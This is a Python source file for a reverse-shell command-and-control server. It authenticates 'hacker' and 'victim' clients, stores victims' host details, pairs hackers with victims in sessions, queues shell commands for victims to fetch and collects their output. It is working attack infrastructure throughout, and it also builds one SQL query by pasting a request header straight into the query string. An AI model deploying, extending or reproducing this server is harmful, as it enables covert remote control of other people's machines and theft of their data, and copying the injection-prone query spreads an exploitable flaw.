""" The reverse shell server and request handler. """

# ---- imports
import json as js
import sys
from binascii import Error as b64decodeError
from functools import partial
from http import HTTPMethod, HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Callable

import reverse_shell.server.server_helper as sh
import reverse_shell.utils as ut


class ZrevshellServer(BaseHTTPRequestHandler):
    """Request handling."""

    def __init__(
        self,
        config: sh.Config,
        sessions: sh.Sessions,
        *args,
        **kwargs,
    ):
        # Our configuration: tokens, ip, port and etc...
        self.config = config
        self.database = config.database

        # Hacker and victim sessions
        self.hacking_sessions = sessions

        # Defining the server_command-function relation using a dict
        self.server_command_functions: dict[
            str, list[HTTPMethod | Callable[..., Any]]
        ] = {
            ut.ServerCommands.post_cmd: [self.handle_cmd_post_cmd, HTTPMethod.POST],
            ut.ServerCommands.register: [self.handle_cmd_register, HTTPMethod.POST],
            ut.ServerCommands.create_session: [
                self.handle_cmd_create_session,
                HTTPMethod.POST,
            ],
            ut.ServerCommands.post_res: [self.handle_cmd_post_res, HTTPMethod.POST],
            ut.ServerCommands.get_session: [
                self.handle_cmd_get_session,
                HTTPMethod.GET,
            ],
            ut.ServerCommands.fetch_cmd: [
                self.handle_cmd_fetch_cmd,
                HTTPMethod.GET,
            ],
            ut.ServerCommands.fetch_res: [
                lambda: (False, HTTPStatus.NOT_IMPLEMENTED),
                HTTPMethod.GET,
            ],
        }

        # Initializing our parent, cuz of respect.
        super().__init__(*args, **kwargs)

    # ----------Utility methods ---------- #

    def c_send_error(self, code: HTTPStatus, message=None, explain=None):
        self.send_error(code, message, explain)
        self.end_headers()

    def check_verified_request(self):
        """Check if the request is verified by ensuring the existence and validity of auth_token
        and existence of the client-id header"""

        client_id = self.headers.get(
            "client-id"
        )  # This might be None if the client_id doesn't exist
        auth_token = self.headers.get("Authorization")  # same goes here

        # If the client_id header doesn't exist then we tell the user
        # that he is sending a bad request
        if client_id is None:
            self.c_send_error(HTTPStatus.BAD_REQUEST)
            return False

        if auth_token is not None:
            # Let's check if the auth_token matches ours
            # First let's decode the token, it might not be valid
            # base64 so we'll error handle it.
            try:
                # Remove the Basic string from the token
                auth_token = auth_token.removeprefix("Basic").strip()
                decoded_token = ut.decode_token(auth_token)
            except (b64decodeError, UnicodeDecodeError):
                pass
            else:
                if decoded_token == self.config.auth_token:
                    return True

        # Well if the user doesn't pass through the above it means the client ain't
        # verified so let's tell that to the client
        self.c_send_error(HTTPStatus.UNAUTHORIZED)
        return False

    def get_client_type_from_db(self, client_id: str):
        """Get the client type of a specified client from the database. This could also be a means to check if the client
        has verified itself."""
        # query data from the database
        usr_client_type = self.database.query(
            f"SELECT client_type FROM clients WHERE client_id='{client_id}'"
        )
        # Let's return None if the client is not find in the database or an error occurred
        if usr_client_type is None or len(usr_client_type) == 0:
            return None

        # if it's not let's return the client_type, by flattening out the list and tuple and
        # converting into the client_type thing.
        usr_client_type = usr_client_type[0][0]
        result = [
            client_type
            for client_type in [
                ut.ClientType.hacker,
                ut.ClientType.victim,
                ut.ClientType.admin,
            ]
            if usr_client_type == client_type.__str__()
        ]
        return result[0]

    def get_header_token(self, token_name: str, fallback=None):
        """Get a header field and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist"""
        token = self.headers.get(token_name, None)

        try:
            if token is not None:
                token = ut.decode_token(token)
            return token
        except (b64decodeError, UnicodeDecodeError):
            return fallback

    def insert_victim_info_db(self, victim_id: str, json_str: str):
        """Insert victims info and specs to the victim_info database. returns None if some error happens"""
        try:
            victim_info = js.loads(json_str)
        except js.JSONDecodeError:
            # Incase if the data the user sent is not valid json
            # we are going to set victim_info to None and later on set
            # the columns to null
            victim_info = None

        if victim_info is not None:
            # Get all the info we need
            host_name = victim_info.get("host_name", None)
            os = victim_info.get("os", None)
            arch = victim_info.get("arch", None)
            cpu = victim_info.get("cpu", None)
            ram = victim_info.get("ram", None)

            # Insert that to the victims database
            return self.database.execute(
                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
                [victim_id, host_name, os, arch, cpu, ram],
            )
        else:
            # Well we couldn't even parse the victim info so let's just
            # insert null everywhere
            return self.database.execute(
                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
                [victim_id, *[None for _ in range(5)]],
            )

    def check_verified_for_cmd(self, cmd: str, client_type: int):
        """Check if a client is verified to access a server command."""
        return client_type in self.config.server_cmd_privileges.get(cmd, [])

    def get_req_body(self):
        """Decode and do everything to read from the body of the request and return the parsed response."""
        # Get the content length.
        try:
            content_length = int(self.headers.get("content-length", 0))
        except ValueError:
            # Incase the content-length header was not a number
            # use 0 as the default
            content_length = 0

        # Get the request body in bytes
        raw_data = self.rfile.read(content_length)

        # Now we expect that the data returned to be base64 encoded
        # let's try to decoded it and return None if not.
        try:
            decoded_data = ut.decode_token(raw_data.decode())
        except (UnicodeDecodeError, b64decodeError):
            decoded_data = None

        return decoded_data

    # ---------- Server command handler methods ---------- #

    def handle_cmd_register(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Do what needs to be done if the server command sent is 'verify'."""
        # First let's check if the user is already in the database
        result = self.database.query(
            "SELECT * FROM clients WHERE client_id=?",
            [client_id],
        )
        # If our result is an empty list that means the user is not there and we can
        # proceed, but if there is something in the list returned, the user already exists
        # so we are going to inform that and stop the execution
        if result is not None:
            if len(result) > 0:
                return sh.HandlerResponse(False, HTTPStatus.CONFLICT)
        # If our user is valid then we can maybe add him to the database
        client_insert_op = self.database.execute(
            "INSERT INTO clients VALUES(?, ?, 1)", [client_id, client_type]
        )
        if client_insert_op is None:
            # Some kinda SQL error happened so let's send a internal server error message
            return sh.HandlerResponse(False, HTTPStatus.INTERNAL_SERVER_ERROR)

        # If the client is a victim then we will require more data from the body and
        # add it to the victim_info database.
        if client_type.__str__() == ut.ClientType.victim.__str__():
            # Let us insert the victim_info in the database after checking if the req_body isn't None
            if req_body is None:
                return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
            self.insert_victim_info_db(client_id, req_body)

        # If all is good return OK
        return sh.HandlerResponse(True, HTTPStatus.OK)

    def handle_cmd_get_session(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Handle the get_session command"""

        session_id = self.hacking_sessions.get_session_id(client_id)

        if session_id is None:
            # This means the victim is not in a session.
            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)

        session_id = ut.encode_token(session_id).encode()

        return sh.HandlerResponse(
            True, HTTPStatus.OK, session_id, {"content-length": str(len(session_id))}
        )

    def handle_cmd_fetch_cmd(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Handle fetch_cmd commands"""
        session_id = req_body

        # Check if there is no body(session_id) provided if not we need
        # to tell the victim so
        if session_id is None or session_id == "":
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # let's check first if the session_id is up and running
        if not self.hacking_sessions.check_session_active(session_id):
            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)

        # Ok now we're sure we have an active session let's now
        # send the victim the commands, but if the command is None
        # rather send a response with no_content
        command = self.hacking_sessions.get_command(session_id)

        if command is None:
            return sh.HandlerResponse(False, HTTPStatus.NO_CONTENT)

        # Ok now let's send the command with an OK res code

        # Encoding the command
        command = ut.encode_token(command).encode()

        return sh.HandlerResponse(
            True, HTTPStatus.OK, command, {"content-length": str(len(command))}
        )

    def handle_cmd_post_res(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Do what needs to be done to handle the 'post_res' server command."""
        # First check if the req_body is None and send an error
        if req_body is None:
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Let's try to decode the request's body into json
        try:
            data = js.loads(req_body)
        except js.JSONDecodeError:
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        session_id = data.get("session_id", None)
        response = data.get("response", None)

        # Check if the necessary keys are not present in the dictionary sent
        if session_id is None or response is None:
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Check if the sent session_id is active
        if not self.hacking_sessions.check_session_active(session_id):
            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)

        # Now check if the session accessed is running and really the client's
        real_session_id = self.hacking_sessions.get_session_id(client_id)

        if real_session_id is None:  # That means the client was never in a session
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        else:
            # Check if the real_session and the requested session match
            if real_session_id != session_id:
                return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)

        # Ok else, let's send the success code and insert the response in the session
        self.hacking_sessions.insert_response(session_id, response)

        return sh.HandlerResponse(True, HTTPStatus.OK)

    def handle_cmd_post_cmd(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Do what needs to be done if the server command is 'post_cmd'"""
        # Bad request return message
        bad_request = sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Check if our req_body isn't None
        if req_body is None:
            return bad_request

        try:
            # Let's try to decode this fella
            data = js.loads(req_body)
        except js.JSONDecodeError:
            # Well if we fail to decode this then we can't proceed
            # so let's return the bad_request as an indicator
            return bad_request

        session_id = data.get("session_id", None)
        command = data.get("command", None)

        if session_id is None or command is None:
            return bad_request

        # Check if the session is not still active
        if not self.hacking_sessions.check_session_active(session_id):
            # The victim is not even in session or it is in one, but
            # not with this hacker. So let's return an error
            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)

        # check if the hacker is in a session and that he is trying to access
        # a session he is in
        real_session_id = self.hacking_sessions.get_session_id(client_id)

        if real_session_id is None:
            # Means if the hacker isn't even in a session
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        elif real_session_id is not None:
            # Now we need to check if the real_session_id provided is really the hackers
            if real_session_id != session_id:
                return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)

        # If we are in session with the victim and satisfy all the other requirements
        # we can proceed by inserting the command in the session comm.
        self.hacking_sessions.insert_command(session_id, command)

        # If all went good, lets once again return the OK response
        return sh.HandlerResponse(True, HTTPStatus.CREATED)

    def handle_cmd_create_session(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Do what needs to be done when the command sent is 'create_session'"""
        # Keep in mind that the req_body in this case is actually the victim_id itself
        # not in json format but plain string.
        victim_id = req_body

        # if no req_body we can't do anything so let's report error
        if victim_id is None:
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        # Let's check if the victim is valid by using the self.get_client_type function
        valid_victim = (
            victim_type := self.get_client_type_from_db(victim_id)
        ) is not None and victim_type == ut.ClientType.victim

        # If the victim is invalid, send a bad request for the user
        if not valid_victim:
            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)

        if self.hacking_sessions.check_client_in_session(victim_id):
            # This means the victim is already in session with another hacker
            # so let's notify the hacker about it by sending a forbidden error
            return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)

        # If the victim is valid and not already in session with somebody else
        # let's put him in a session with the hacker.
        session_id = self.hacking_sessions.add_session(client_id, victim_id)
        # Encode the session_id with base64 and turn it to bytes
        session_id = ut.encode_token(session_id).encode("utf8")

        # Finally report the OK message
        return sh.HandlerResponse(
            True, HTTPStatus.OK, session_id, {"Content-Length": str(len(session_id))}
        )

    def execute_command(
        self,
        client_id: str,
        command: str,
        handler_func,
        *args,
        get_client_type_from_headers: bool = False,
        **kwargs,
    ):
        """This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the and client_id, req_body. The rest arguments and keyword arguments will be passed to the handler_func. req_body will be set to None if there is an error parsing the body.
        """
        legit_client = False

        hacker_token = self.get_header_token("hacker-token")
        admin_token = self.get_header_token("admin-token")

        legit_user: dict[str, bool] = {
            ut.ClientType.hacker.__str__(): hacker_token is not None
            and hacker_token == self.config.hacker_token,
            ut.ClientType.admin.__str__(): admin_token is not None
            and admin_token == self.config.admin_token,
            ut.ClientType.victim.__str__(): True,
        }

        if get_client_type_from_headers:
            # First get the client_type of the user and check
            # if the user claims match his tokens.

            # This is only done the first time, when verifying. after we will
            # look for the user in the database.

            client_type = self.headers.get("client-type", None)

            if client_type is not None and legit_user.get(client_type, False):
                # Let's check if the client is able to access the server command
                if self.check_verified_for_cmd(command, int(client_type)):
                    legit_client = True

        else:
            # Ok so first let's get the client-type from the database and
            # use that to check if the user can access the path it's accessing
            client_type = self.get_client_type_from_db(client_id)

            # Check if the client has needed tokens for it's type
            has_tokens = legit_user[client_type.__str__()]

            # if the client_type is None it means there is no client
            # with the client_id we gave so let's tell the user that
            # he made an unauthorized request.
            if (
                client_type is not None
                and self.check_verified_for_cmd(command, client_type)
                and has_tokens
            ):
                legit_client = True

        if not legit_client:
            # It doesn't seem we are authorized
            self.c_send_error(HTTPStatus.UNAUTHORIZED)
            return

        # Now let's get the post request body of the request according to validate_req_body function
        body = self.get_req_body()

        # Having the post request ready and having a legit client let's execute
        # the handler for the command.
        result: sh.HandlerResponse = handler_func(
            *args, client_id=client_id, client_type=client_type, req_body=body, **kwargs
        )

        # Now we will send what the result sends, the result is expected to be
        # HandlerResponse which is easier to maintain.
        if result.successful is True:
            self.send_response(result.res_code)
            for header, value in result.headers.items():
                self.send_header(header, value)
            self.end_headers()
        else:
            self.c_send_error(result.res_code)

        # let's add the body if provided in the
        # response by the handler_func
        if result.body is not None:
            self.wfile.write(result.body)

    # ---------- HTTP request method handler methods ---------- #

    def main_handler(self, method: HTTPMethod):
        """Handle requests."""

        # Check if the request is valid
        if not self.check_verified_request():
            return

        # Get the client id
        client_id = self.headers.get("client-id").__str__()

        # This is for when accessing the root path. simply send
        # an OK code with a simple html file.
        if self.path == "/":
            data = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8" />
                <meta http-equiv="X-UA-Compatible" content="IE=edge" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Thank You</title>
            </head>
            <body>
                <h2>Thanks for the visit!</h2>
            </body>
            </html>
            """.encode()

            self.send_response(HTTPStatus.OK)
            self.send_header("content-type", "text/html")
            self.send_header("content-length", f"{len(data)}")
            self.end_headers()
            self.wfile.write(data)
            return

        # the self.path is the command's id in this case
        command = self.config.server_cmds.get(self.path, None)

        if command is None:
            # The path requested doesn't match the server_cmds so tell the user that using a 404 error
            self.c_send_error(HTTPStatus.NOT_FOUND)
            return

        # Now let's check if the path(command) requested is available in this method
        handler, required_method = self.server_command_functions[command]

        if required_method != method:
            # If this path(command) is not meant for this particular
            # method, then send a 404
            self.c_send_error(HTTPStatus.NOT_FOUND)
            return

        # ---- Command execution & authorization
        self.execute_command(
            client_id,
            command,
            handler,
            get_client_type_from_headers=(
                True if command == ut.ServerCommands.register else False
            ),
        )

    def do_GET(self):
        """Handle the GET requests."""
        self.main_handler(HTTPMethod.GET)

    def do_POST(self):
        """Handle POST requests."""
        self.main_handler(HTTPMethod.POST)


def run_server(
    configuration: sh.Config,
    sessions: sh.Sessions,
    httpd: HTTPServer | None = None,
):
    """Start the HTTP server"""

    # Getting the ip and port from the config
    ip, port = configuration.ip, configuration.port

    # We are using partials because only can pass the class to
    # HTTPServer not an object so we can use functools.partial to solve
    # the issue.
    zrevshell_server = partial(ZrevshellServer, configuration, sessions)

    # Initiate the server
    ut.log("debug", f"Server is starting on ({ip}:{port})...")
    if httpd is None:
        httpd = HTTPServer((ip, port), zrevshell_server)
    ut.log("success", "Server has successfully started!")
    # Means print an empty line, i think...
    print("\r")
    ut.log("info", "-------- Tokens --------")
    # If in debug mode we are going to print the server_commands and
    # the encoded version of the tokens to make debugging easier
    ut.log(
        "info",
        (
            "Authentication Token:"
            f" {configuration.auth_token}{f'  --  {ut.encode_token(configuration.auth_token)}' if configuration.is_debug else ''}"
        ),
    )
    ut.log(
        "info",
        (
            "Administration Token:"
            f" {configuration.admin_token}{f'  --  {ut.encode_token(configuration.admin_token)}' if configuration.is_debug else ''}"
        ),
    )
    ut.log(
        "info",
        (
            "Hacking Token:"
            f" {configuration.hacker_token}{f'  --  {ut.encode_token(configuration.hacker_token)}' if configuration.is_debug else ''}"
        ),
    )

    # Printing the server commands
    if configuration.is_debug:
        print("\r")
        ut.log("info", "--------- Server request endpoints --------")
        for key, val in configuration.server_cmds.items():
            ut.log("info", f"{val} -- {key}")

    # Create some empty space for the proceeding
    print("\r")
    # Create a header for the logs that the http server generates
    ut.log("info", "--------- Server Logs --------")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        # It's because we use keyboard interrupt normally to stop
        # the server.
        pass

    # Actually does nothing, but incase we override it
    # and need to clean up our server
    httpd.server_close()

    ut.log("debug", "Server has shutdown!")
    sys.exit(0)


def main():
    """Run the reverse shell server"""
    # Initializing our configuration
    parser = sh.get_argument_parser()
    configuration = sh.Config(parser.parse_args())

    # Creating our sessions
    sessions = sh.Sessions()

    # Let's rockin roll
    run_server(configuration, sessions)


if __name__ == "__main__":
    main()
